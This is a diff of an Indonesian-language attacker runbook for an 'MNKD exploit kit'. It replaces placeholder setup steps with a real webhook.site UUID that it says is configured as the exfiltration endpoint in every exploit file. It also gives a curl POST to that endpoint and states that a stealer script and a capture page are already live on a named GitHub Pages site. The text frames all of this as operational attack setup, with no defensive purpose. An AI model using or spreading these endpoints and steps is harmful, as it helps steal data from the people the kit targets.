@@ -69,63 +69,33 @@ VICTIM                          ATTACKER                        MYADMIN
 
 ## PRE-REQUISITES (Attacker Setup)
 
-### Step 0.1: Create Webhook Endpoint
+### Step 0.1: Webhook SUDAH Terkonfigurasi
 
+Webhook sudah terpasang di semua file exploit:
 ```
-1. Buka https://webhook.site
-2. Copy UUID yang muncul (contoh: a1b2c3d4-e5f6-7890-abcd-ef1234567890)
-3. Simpan — ini endpoint exfiltrasi Anda
-```
-
-### Step 0.2: Clone & Configure Exploit Repo
-
-```bash
-git clone https://github.com/telojos11/mnkd.git
-cd mnkd
+https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c
 ```
 
-Edit 3 file, ganti `YOUR_UUID_HERE` dengan UUID dari webhook.site:
+Buka https://webhook.site untuk monitor incoming data.
 
-```bash
-# File: index.html (line ~202)
-WEBHOOK = "https://webhook.site/a1b2c3d4-e5f6-7890-abcd-ef1234567890"
-
-# File: stealer.js (line ~28)
-WEBHOOK = "https://webhook.site/a1b2c3d4-e5f6-7890-abcd-ef1234567890"
-
-# File: capture.html (line ~45)
-WEBHOOK = "https://webhook.site/a1b2c3d4-e5f6-7890-abcd-ef1234567890"
-```
-
-### Step 0.3: Deploy ke GitHub Pages
-
-```bash
-git add .
-git commit -m "Deploy MNKD exploit kit"
-git push origin main
-
-# Enable GitHub Pages:
-# Buka https://github.com/telojos11/mnkd/settings/pages
-# Source: "Deploy from a branch"
-# Branch: main, folder: / (root)
-# Save
-```
-
-Setelah 1-2 menit, exploit live di:
-- **Main page:** `https://telojos11.github.io/mnkd/`
-- **Stealer:** `https://telojos11.github.io/mnkd/stealer.js`
-- **Capture page:** `https://telojos11.github.io/mnkd/capture.html`
-
-### Step 0.4: Verifikasi Webhook
+### Step 0.2: Verifikasi Webhook
 
 ```bash
 # Test — kirim data dummy
-curl -X POST https://webhook.site/a1b2c3d4-e5f6-7890-abcd-ef1234567890 \
+curl -X POST https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c \
   -H "Content-Type: application/json" \
   -d '{"test":"hello"}'
 
-# Buka webhook.site, refresh — seharusnya muncul data
+# Buka https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c
+# Refresh — seharusnya muncul data
 ```
+
+### Step 0.3: GitHub Pages SUDAH Aktif
+
+Exploit sudah live di:
+- **Main page:** `https://telojos11.github.io/mnkd/`
+- **Stealer:** `https://telojos11.github.io/mnkd/stealer.js`
+- **Capture page:** `https://telojos11.github.io/mnkd/capture.html`
 
 ---
 
